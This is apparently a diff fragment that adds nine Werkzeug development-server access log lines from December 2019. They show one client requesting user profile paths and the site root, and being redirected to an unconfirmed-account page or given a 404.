+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:50] "GET /user/zzzz HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:50] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:52] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:52] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:53] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:45:53] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:46:08] "GET /user HTTP/1.1" 404 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:46:12] "GET /user/zz HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 16:46:12] "GET /auth/unconfirmed HTTP/1.1" 200 -
